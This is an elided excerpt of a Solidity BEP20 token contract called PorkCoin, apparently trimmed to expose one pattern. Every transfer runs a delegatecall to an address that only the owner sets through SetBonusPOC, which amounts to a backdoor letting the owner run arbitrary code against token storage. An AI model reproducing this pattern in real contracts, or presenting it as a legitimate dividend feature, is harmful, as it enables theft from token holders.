...
contract PorkCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'PorkCoin';
  ...
  */
  ...
  function claimDividendPOC(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_POC.delegatecall(
  ...
  function SetBonusPOC(address c) public onlyOwner {
    C_POC = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendPOC(sender, recipient, amount);   
